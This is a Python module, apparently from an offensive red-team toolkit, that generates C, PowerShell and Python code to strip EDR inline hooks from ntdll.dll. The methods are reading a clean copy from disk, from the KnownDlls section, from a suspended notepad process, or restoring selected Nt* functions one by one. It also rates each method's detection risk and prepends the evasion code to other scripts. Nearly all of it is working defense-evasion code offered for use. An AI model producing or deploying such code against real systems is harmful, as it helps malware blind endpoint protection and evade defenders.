"""NTDLL Unhooking — remove EDR inline hooks from ntdll.dll.

EDR agents hook Nt* API functions by placing JMP instructions (inline
hooks) at the start of ntdll exports.  This module generates code that
replaces the hooked .text section with a clean copy, restoring original
syscall stubs.

Techniques:
    1. Disk Read     — map clean ntdll from C:\\Windows\\System32\\ntdll.dll
    2. KnownDlls     — open \\KnownDlls\\ntdll.dll section object
    3. Suspended Proc — spawn suspended process, read its ntdll
    4. Debug Proc     — attach as debugger, read clean ntdll from child
    5. Selective      — unhook only specific functions instead of full .text

FOR AUTHORIZED PENETRATION TESTING AND RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

from dataclasses import dataclass, field
from enum import Enum
from typing import Any


class UnhookMethod(Enum):
    """Source of clean ntdll copy."""
    DISK_READ = "disk_read"
    KNOWN_DLLS = "known_dlls"
    SUSPENDED_PROCESS = "suspended_process"
    DEBUG_PROCESS = "debug_process"


class UnhookScope(Enum):
    """How much of ntdll to unhook."""
    FULL_TEXT = "full_text"
    SELECTIVE = "selective"


@dataclass
class UnhookConfig:
    """Configuration for NTDLL unhooking."""
    method:              UnhookMethod = UnhookMethod.KNOWN_DLLS
    scope:               UnhookScope = UnhookScope.FULL_TEXT
    selective_functions:  list[str] = field(default_factory=lambda: [
        "NtAllocateVirtualMemory",
        "NtProtectVirtualMemory",
        "NtWriteVirtualMemory",
        "NtCreateThreadEx",
        "NtMapViewOfSection",
        "NtQueueApcThread",
        "NtOpenProcess",
    ])
    verify_after_unhook: bool = True
    cleanup_handles:     bool = True

    def to_dict(self) -> dict[str, Any]:
        return {
            "method": self.method.value,
            "scope": self.scope.value,
            "selective_functions": self.selective_functions,
            "verify_after_unhook": self.verify_after_unhook,
            "cleanup_handles": self.cleanup_handles,
        }


# ═══════════════════════════════════════════════════════════════════
#  C STUBS
# ═══════════════════════════════════════════════════════════════════

_C_UNHOOK_DISK_READ = r"""
// Forge Suite v5 APEX — NTDLL Unhook via Disk Read
// FOR AUTHORIZED RED TEAM OPERATIONS ONLY
// Technique: T1562.001 (Impair Defenses: Disable or Modify Tools)
#include <windows.h>

BOOL unhook_ntdll_disk(void) {
    // 1. Get current ntdll base
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    // 2. Map clean copy from disk
    HANDLE hFile = CreateFileA(
        "C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMap) { CloseHandle(hFile); return FALSE; }

    LPVOID clean_ntdll = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (!clean_ntdll) {
        CloseHandle(hMap);
        CloseHandle(hFile);
        return FALSE;
    }

    // 3. Find .text section
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            LPVOID hooked_text = (BYTE*)hNtdll + sec[i].VirtualAddress;
            LPVOID clean_text  = (BYTE*)clean_ntdll + sec[i].VirtualAddress;
            SIZE_T text_size   = sec[i].Misc.VirtualSize;

            // 4. Change protection to RWX
            DWORD old_protect = 0;
            VirtualProtect(hooked_text, text_size, PAGE_EXECUTE_READWRITE, &old_protect);

            // 5. Overwrite hooked .text with clean copy
            memcpy(hooked_text, clean_text, text_size);

            // 6. Restore original protection
            VirtualProtect(hooked_text, text_size, old_protect, &old_protect);
            break;
        }
    }

    // 7. Cleanup
    UnmapViewOfFile(clean_ntdll);
    CloseHandle(hMap);
    CloseHandle(hFile);
    return TRUE;
}
"""

_C_UNHOOK_KNOWN_DLLS = r"""
// Forge Suite v5 APEX — NTDLL Unhook via KnownDlls Section
// FOR AUTHORIZED RED TEAM OPERATIONS ONLY
// Opens \KnownDlls\ntdll.dll section object — avoids touching disk
// (no file I/O events for EDR to see)
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pNtOpenSection)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES
);

BOOL unhook_ntdll_knowndlls(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    // Get NtOpenSection (might itself be hooked — use disk fallback if needed)
    pNtOpenSection NtOpenSection = (pNtOpenSection)GetProcAddress(hNtdll, "NtOpenSection");
    if (!NtOpenSection) return FALSE;

    // Open \KnownDlls\ntdll.dll section
    UNICODE_STRING us;
    us.Buffer = L"\\KnownDlls\\ntdll.dll";
    us.Length = wcslen(us.Buffer) * sizeof(WCHAR);
    us.MaximumLength = us.Length + sizeof(WCHAR);

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hSection = NULL;
    NTSTATUS status = NtOpenSection(&hSection, SECTION_MAP_READ, &oa);
    if (status != 0) return FALSE;

    // Map the section
    LPVOID clean_ntdll = MapViewOfFile(hSection, FILE_MAP_READ, 0, 0, 0);
    if (!clean_ntdll) {
        CloseHandle(hSection);
        return FALSE;
    }

    // Replace .text section
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            LPVOID hooked_text = (BYTE*)hNtdll + sec[i].VirtualAddress;
            LPVOID clean_text  = (BYTE*)clean_ntdll + sec[i].VirtualAddress;
            SIZE_T text_size   = sec[i].Misc.VirtualSize;

            DWORD old_protect = 0;
            VirtualProtect(hooked_text, text_size, PAGE_EXECUTE_READWRITE, &old_protect);
            memcpy(hooked_text, clean_text, text_size);
            VirtualProtect(hooked_text, text_size, old_protect, &old_protect);
            break;
        }
    }

    UnmapViewOfFile(clean_ntdll);
    CloseHandle(hSection);
    return TRUE;
}
"""

_C_UNHOOK_SUSPENDED = r"""
// Forge Suite v5 APEX — NTDLL Unhook via Suspended Process
// FOR AUTHORIZED RED TEAM OPERATIONS ONLY
// Spawn a suspended process, read its pristine ntdll, then terminate it.
// EDR hooks are applied during process initialization — suspended process
// hasn't initialized yet, so its ntdll is clean.
#include <windows.h>

BOOL unhook_ntdll_suspended(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};

    // Create suspended notepad.exe (benign process)
    if (!CreateProcessA(
            "C:\\Windows\\System32\\notepad.exe",
            NULL, NULL, NULL, FALSE,
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            NULL, NULL, &si, &pi)) {
        return FALSE;
    }

    // Find ntdll in the suspended process
    // The ntdll base address is the same across processes (ASLR per-boot, not per-process)
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            SIZE_T text_size = sec[i].Misc.VirtualSize;
            LPVOID clean_text = VirtualAlloc(NULL, text_size, MEM_COMMIT, PAGE_READWRITE);
            if (!clean_text) break;

            SIZE_T bytes_read = 0;
            LPVOID remote_text = (BYTE*)hNtdll + sec[i].VirtualAddress;

            // Read clean .text from suspended process
            if (ReadProcessMemory(pi.hProcess, remote_text, clean_text,
                                  text_size, &bytes_read) && bytes_read == text_size) {
                // Overwrite our hooked .text
                LPVOID local_text = (BYTE*)hNtdll + sec[i].VirtualAddress;
                DWORD old_protect = 0;
                VirtualProtect(local_text, text_size, PAGE_EXECUTE_READWRITE, &old_protect);
                memcpy(local_text, clean_text, text_size);
                VirtualProtect(local_text, text_size, old_protect, &old_protect);
            }

            VirtualFree(clean_text, 0, MEM_RELEASE);
            break;
        }
    }

    // Terminate the suspended process
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;
}
"""

_C_UNHOOK_SELECTIVE = r"""
// Forge Suite v5 APEX — Selective Function Unhook
// FOR AUTHORIZED RED TEAM OPERATIONS ONLY
// Only unhook specific functions instead of the entire .text section.
// Lower footprint — avoids the VirtualProtect on the entire section
// which some EDRs flag.
#include <windows.h>

#define SYSCALL_STUB_SIZE 32  // Size of a typical ntdll syscall stub

BOOL unhook_function(const char *func_name, LPVOID clean_ntdll) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll || !clean_ntdll) return FALSE;

    // Resolve function in both hooked and clean copies
    FARPROC hooked_func = GetProcAddress(hNtdll, func_name);
    if (!hooked_func) return FALSE;

    // Calculate offset from ntdll base
    SIZE_T offset = (BYTE*)hooked_func - (BYTE*)hNtdll;
    BYTE *clean_func = (BYTE*)clean_ntdll + offset;

    // Check if function is actually hooked (starts with JMP)
    BYTE *hooked_bytes = (BYTE*)hooked_func;
    if (hooked_bytes[0] != 0xE9 && hooked_bytes[0] != 0xFF &&
        !(hooked_bytes[0] == 0x48 && hooked_bytes[1] == 0xB8)) {
        return TRUE;  // Not hooked, nothing to do
    }

    // Overwrite hooked stub with clean copy
    DWORD old_protect = 0;
    VirtualProtect(hooked_func, SYSCALL_STUB_SIZE,
                   PAGE_EXECUTE_READWRITE, &old_protect);
    memcpy(hooked_func, clean_func, SYSCALL_STUB_SIZE);
    VirtualProtect(hooked_func, SYSCALL_STUB_SIZE, old_protect, &old_protect);

    return TRUE;
}

// Unhook a list of functions
BOOL unhook_functions(const char **func_names, int count, LPVOID clean_ntdll) {
    BOOL all_ok = TRUE;
    for (int i = 0; i < count; i++) {
        if (!unhook_function(func_names[i], clean_ntdll)) {
            all_ok = FALSE;
        }
    }
    return all_ok;
}
"""

# ═══════════════════════════════════════════════════════════════════
#  POWERSHELL STUBS
# ═══════════════════════════════════════════════════════════════════

_PS1_UNHOOK = r"""
# Forge Suite v5 APEX — NTDLL Unhook (PowerShell)
# FOR AUTHORIZED RED TEAM OPERATIONS ONLY
# Maps clean ntdll from disk and overwrites hooked .text section

function Invoke-NtdllUnhook {
    param(
        [ValidateSet('DiskRead','KnownDlls')]
        [string]$Method = 'DiskRead'
    )

    $Kernel32 = @"
    using System;
    using System.Runtime.InteropServices;
    public class K32 {
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern IntPtr CreateFileA(string lpFileName, uint dwDesiredAccess,
            uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition,
            uint dwFlagsAndAttributes, IntPtr hTemplateFile);
        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateFileMappingA(IntPtr hFile, IntPtr lpAttributes,
            uint flProtect, uint dwMaxHigh, uint dwMaxLow, string lpName);
        [DllImport("kernel32.dll")]
        public static extern IntPtr MapViewOfFile(IntPtr hFileMappingObject,
            uint dwDesiredAccess, uint dwFileOffsetHigh, uint dwFileOffsetLow, UIntPtr dwNumberOfBytesToMap);
        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
            uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32.dll")]
        public static extern bool UnmapViewOfFile(IntPtr lpBaseAddress);
        [DllImport("kernel32.dll")]
        public static extern bool CloseHandle(IntPtr hObject);
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandleA(string lpModuleName);
    }
"@
    Add-Type $Kernel32 -ErrorAction SilentlyContinue

    $ntdllBase = [K32]::GetModuleHandleA("ntdll.dll")
    if ($ntdllBase -eq [IntPtr]::Zero) { Write-Error "Failed to get ntdll base"; return }

    # Map clean ntdll
    $hFile = [K32]::CreateFileA("C:\Windows\System32\ntdll.dll", 0x80000000, 1,
        [IntPtr]::Zero, 3, 0x80, [IntPtr]::Zero)
    $hMap = [K32]::CreateFileMappingA($hFile, [IntPtr]::Zero, 0x02 -bor 0x01000000,
        0, 0, $null)
    $cleanNtdll = [K32]::MapViewOfFile($hMap, 4, 0, 0, [UIntPtr]::Zero)

    # Parse PE to find .text
    $e_lfanew = [System.Runtime.InteropServices.Marshal]::ReadInt32($ntdllBase, 0x3C)
    $ntHeaders = [IntPtr]::Add($ntdllBase, $e_lfanew)
    $numSections = [System.Runtime.InteropServices.Marshal]::ReadInt16($ntHeaders, 6)
    $optHeaderSize = [System.Runtime.InteropServices.Marshal]::ReadInt16($ntHeaders, 20)
    $firstSection = [IntPtr]::Add($ntHeaders, 24 + $optHeaderSize)

    for ($i = 0; $i -lt $numSections; $i++) {
        $secHeader = [IntPtr]::Add($firstSection, $i * 40)
        $secName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($secHeader, 8).TrimEnd("`0")
        if ($secName -eq '.text') {
            $virtualSize = [System.Runtime.InteropServices.Marshal]::ReadInt32($secHeader, 8)
            $virtualAddr = [System.Runtime.InteropServices.Marshal]::ReadInt32($secHeader, 12)

            $hookedText = [IntPtr]::Add($ntdllBase, $virtualAddr)
            $cleanText = [IntPtr]::Add($cleanNtdll, $virtualAddr)

            # Unprotect, copy, reprotect
            $oldProtect = [uint32]0
            [K32]::VirtualProtect($hookedText, [UIntPtr]::new($virtualSize), 0x40, [ref]$oldProtect)

            $buf = [byte[]]::new($virtualSize)
            [System.Runtime.InteropServices.Marshal]::Copy($cleanText, $buf, 0, $virtualSize)
            [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $hookedText, $virtualSize)

            [K32]::VirtualProtect($hookedText, [UIntPtr]::new($virtualSize), $oldProtect, [ref]$oldProtect)
            Write-Host "[+] Unhooked ntdll.dll .text section ($virtualSize bytes)"
            break
        }
    }

    [K32]::UnmapViewOfFile($cleanNtdll)
    [K32]::CloseHandle($hMap)
    [K32]::CloseHandle($hFile)
}
"""

# ═══════════════════════════════════════════════════════════════════
#  PYTHON EMULATION STUB
# ═══════════════════════════════════════════════════════════════════

_PYTHON_UNHOOK = """\
\"\"\"NTDLL unhook emulation — for planning and testing only.

Actual unhooking requires native code running on a Windows target.
This module provides method documentation and validation helpers.
\"\"\"

UNHOOK_METHODS = {
    "disk_read": {
        "description": "Map clean ntdll from C:\\\\Windows\\\\System32\\\\ntdll.dll",
        "opsec": "Medium — CreateFileA on ntdll.dll visible to file-monitoring EDR",
        "reliability": "High — always available unless disk access restricted",
        "detection": "File open events on ntdll.dll, NtCreateFile telemetry",
    },
    "known_dlls": {
        "description": "Open \\\\KnownDlls\\\\ntdll.dll section object",
        "opsec": "High — no file I/O events, uses existing kernel section",
        "reliability": "High — KnownDlls always contains ntdll on modern Windows",
        "detection": "NtOpenSection on KnownDlls path (less commonly monitored)",
    },
    "suspended_process": {
        "description": "Spawn suspended process, read its clean ntdll",
        "opsec": "Low — process creation events are heavily monitored",
        "reliability": "High — ntdll is always clean in suspended processes",
        "detection": "Process creation + ReadProcessMemory cross-process",
    },
    "debug_process": {
        "description": "Attach debugger to child, read clean ntdll",
        "opsec": "Very Low — debug events are high-signal for EDR",
        "reliability": "Medium — requires debug privileges",
        "detection": "Debug API usage, NtDebugActiveProcess telemetry",
    },
}

def get_method_info(method: str) -> dict:
    \"\"\"Return opsec and reliability info for an unhook method.\"\"\"
    return UNHOOK_METHODS.get(method, {"error": f"Unknown method: {method}"})

def validate_unhook_scope(scope: str, functions: list[str] | None = None) -> dict:
    \"\"\"Validate unhook configuration.\"\"\"
    if scope == "selective" and not functions:
        return {"valid": False, "error": "Selective scope requires function list"}
    return {"valid": True, "scope": scope, "function_count": len(functions or [])}

if __name__ == '__main__':
    for method, info in UNHOOK_METHODS.items():
        print(f"  {method:<25} OpSec: {info['opsec']}")
    print(f"\\n[+] {len(UNHOOK_METHODS)} unhook methods available")
"""


# ═══════════════════════════════════════════════════════════════════
#  PUBLIC API
# ═══════════════════════════════════════════════════════════════════

def get_unhook_stub(
    config: UnhookConfig | None = None,
    lang: str = "c",
) -> str:
    """Return NTDLL unhooking code for the specified language.

    Args:
        config: UnhookConfig or None for defaults.
        lang:   Target language ('c', 'ps1', 'python').

    Returns:
        Code string for the selected unhooking method.
    """
    config = config or UnhookConfig()

    if lang == "ps1":
        return _PS1_UNHOOK
    if lang == "python":
        return _PYTHON_UNHOOK

    # C — select by method
    parts = []

    if config.method == UnhookMethod.DISK_READ:
        parts.append(_C_UNHOOK_DISK_READ)
    elif config.method == UnhookMethod.KNOWN_DLLS:
        parts.append(_C_UNHOOK_KNOWN_DLLS)
    elif config.method == UnhookMethod.SUSPENDED_PROCESS:
        parts.append(_C_UNHOOK_SUSPENDED)
    elif config.method == UnhookMethod.DEBUG_PROCESS:
        # No dedicated debug stub yet — fall back to disk read
        # TODO: Implement NtDebugActiveProcess-based unhook
        parts.append("// NOTE: DEBUG_PROCESS not yet implemented, falling back to disk read")
        parts.append(_C_UNHOOK_DISK_READ)

    if config.scope == UnhookScope.SELECTIVE:
        parts.append(_C_UNHOOK_SELECTIVE)

    # Optional verification stub — checks that hooks were actually removed
    if config.verify_after_unhook:
        parts.append(r"""
// Post-unhook verification — confirm Nt* stubs start with mov r10,rcx
static BOOL verify_unhook(const char **func_names, int count) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;
    for (int i = 0; i < count; i++) {
        BYTE *p = (BYTE*)GetProcAddress(hNtdll, func_names[i]);
        if (!p) continue;
        // Check for clean syscall stub: 4C 8B D1 (mov r10,rcx)
        if (p[0] != 0x4C || p[1] != 0x8B || p[2] != 0xD1) {
            return FALSE;  // Still hooked
        }
    }
    return TRUE;
}
""")

    return "\n".join(parts)


def inject_unhook(
    script: str,
    config: UnhookConfig | None = None,
    lang: str = "c",
) -> str:
    """Prepend unhooking code to an existing script.

    Args:
        script: Existing source code.
        config: Configuration.
        lang:   Target language.

    Returns:
        Script with unhooking code prepended.
    """
    stub = get_unhook_stub(config, lang)
    return stub + "\n" + script


def generate_unhook_config(config: UnhookConfig | None = None) -> dict[str, Any]:
    """Generate complete unhooking configuration with stubs.

    Args:
        config: UnhookConfig or None for defaults.

    Returns:
        Dict with config and code stubs.
    """
    config = config or UnhookConfig()
    return {
        "config": config.to_dict(),
        "stubs": {
            "c": get_unhook_stub(config, "c"),
            "ps1": get_unhook_stub(config, "ps1"),
            "python": get_unhook_stub(config, "python"),
        },
    }
